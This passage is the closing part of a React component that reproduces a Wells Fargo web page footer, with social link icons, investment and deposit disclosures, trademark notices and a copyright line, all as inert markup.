                      data-newbrowser=""
                      enrollmentid=""
                      data-rottracking=""
                      className="icon-linkedin social-icon"
                      data-params=""
                      aria-label="Wells Fargo LinkedIn page"
                      data-exit="true"
                      data-destinationtype="none"
                      data-nativelinktype="none"
                      refplatform="newwindow"
                      data-href-id={3224300702}
                      href="#"
                      target="_blank"
                    />
                  </li>
                  <li>
                    <a
                      data-platform="external"
                      data-newbrowser=""
                      enrollmentid=""
                      data-rottracking=""
                      className="icon-instagram social-icon"
                      data-params=""
                      aria-label="Wells Fargo Instagram page"
                      data-destinationtype="none"
                      data-nativelinktype="none"
                      data-exit="true"
                      refplatform="newwindow"
                      data-href-id={5224300702}
                      href="#"
                      target="_blank"
                    />
                  </li>
                  <li>
                    <a
                      data-platform="external"
                      data-newbrowser=""
                      enrollmentid=""
                      data-rottracking=""
                      className="icon-pinterest social-icon"
                      data-params=""
                      aria-label="Wells Fargo Pinterest page"
                      data-exit="true"
                      data-destinationtype="none"
                      data-nativelinktype="none"
                      refplatform="newwindow"
                      data-href-id={7224300702}
                      href="#"
                      target="_blank"
                    />
                  </li>
                  <li>
                    <a
                      data-platform="external"
                      data-newbrowser=""
                      enrollmentid=""
                      data-rottracking=""
                      className="icon-youtube social-icon"
                      data-params=""
                      aria-label="Wells Fargo Youtube page "
                      data-exit="true"
                      data-destinationtype="none"
                      data-nativelinktype="none"
                      refplatform="newwindow"
                      data-href-id={9224300702}
                      href="#"
                      target="_blank"
                    />
                  </li>
                  <li>
                    <a
                      data-platform="external"
                      data-newbrowser=""
                      enrollmentid=""
                      data-rottracking=""
                      className="icon-twitter social-icon"
                      data-params=""
                      aria-label="Wells Fargo Twitter page "
                      data-exit="true"
                      data-destinationtype="none"
                      data-nativelinktype="none"
                      refplatform="newwindow"
                      data-href-id={11224300702}
                      href="#"
                      target="_blank"
                    />
                  </li>
                </ul>
              </div>
            </div>
            <div
              className="ps-not-not presentedElement"
              data-cid="tcm:84-228728-16"
              data-ctid="tcm:91-223674-32"
            >
              <p>Investment and Insurance Products are:</p>
              <ul>
                <li>
                  Not Insured by the FDIC or Any Federal Government Agency
                </li>
                <li>
                  Not a Deposit or Other Obligation of, or Guaranteed by, the
                  Bank or Any Bank Affiliate
                </li>
                <li>
                  Subject to Investment Risks, Including Possible Loss of the
                  Principal Amount Invested
                </li>
              </ul>
            </div>
            <div
              className="ps-footnote-text"
              data-cid="tcm:84-224322-16"
              data-ctid="tcm:91-223670-32"
            >
              <p></p>
              <p>
                Investment products and services are offered through Wells Fargo
                Advisors. Wells Fargo Advisors is a trade name used by Wells
                Fargo Clearing Services, LLC (WFCS) and Wells Fargo Advisors
                Financial Network, LLC, Members{" "}
                <a
                  data-exit="true"
                  aria-label="hyperlink text opens dialogue"
                  target="_blank"
                  data-href-id={13224300702}
                  href="#"
                >
                  SIPC
                </a>
                , separate registered broker-dealers and non-bank affiliates of
                Wells Fargo &amp; Company.
              </p>
              <p />
            </div>
            <div
              className="ps-footnote-text"
              data-cid="tcm:84-327805-16"
              data-ctid="tcm:91-223670-32"
            >
              <p></p>
              <p>
                1. Availability may be affected by your mobile carrier’s
                coverage area. Your mobile carrier’s message and data rates may
                apply. Fargo is only available on the smartphone versions of the
                Wells Fargo Mobile<sup>®</sup> app.
              </p>
              <p />
            </div>
            <div
              className="ps-footnote-text"
              data-cid="tcm:84-148263-16"
              data-ctid="tcm:91-223670-32"
            >
              <p></p>
              <p>
                Android, Google Play, Chrome, Pixel and other marks are
                trademarks of Google LLC.
              </p>
              <p />
            </div>
            <div
              className="ps-footnote-text"
              data-cid="tcm:84-38072-16"
              data-ctid="tcm:91-223670-32"
            >
              <p></p>
              <p>
                Apple, the Apple logo, Apple Pay, Apple Watch, Face ID, iCloud
                Keychain, iPad, iPad Pro, iPhone, iTunes, Mac, Safari, and Touch
                ID are trademarks of Apple Inc., registered in the U.S. and
                other countries. Apple Wallet is a trademark of Apple Inc. App
                Store is a service mark of Apple Inc.
              </p>
              <p />
            </div>
            <div
              className="ps-footnote-text"
              data-cid="tcm:84-6793-16"
              data-ctid="tcm:91-223670-32"
            >
              <p></p>
              <p>
                Deposit products offered by Wells Fargo Bank, N.A. Member FDIC.
              </p>
              <p />
            </div>
            <div
              className="ps-footnote-footer"
              data-cid="tcm:84-226264-16"
              data-ctid="tcm:91-223661-32"
            >
              <span className="ps-home-lending-icon">‍</span>
              <span xmlLang="en" lang="en">
                Equal Housing Lender
              </span>
            </div>
            <div
              className="ps-footnote-text"
              data-cid="tcm:84-233318-16"
              data-ctid="tcm:91-223670-32"
            >
              <p></p>
              <p>PM-09282026-7798034.1.1</p>
              <p />
            </div>
            <div
              className="ps-footnote-text"
              data-cid="tcm:84-329632-16"
              data-ctid="tcm:91-223670-32"
            >
              <p></p>
              <p>LRC-0325</p>
              <p />
            </div>
            <div>
              <div className="ps-gray-line-container sf-hidden"></div>
              <div
                className="ps-copyright"
                data-cid="tcm:84-224468-16"
                data-ctid="tcm:91-223675-32"
              >
                © 1999 - 2026 Wells Fargo. NMLSR ID 399801
              </div>
            </div>
          </div>
        </footer>
      </div>
      <div className="visuallyHidden"> </div>
    </>
  );
};

export default MainPage;
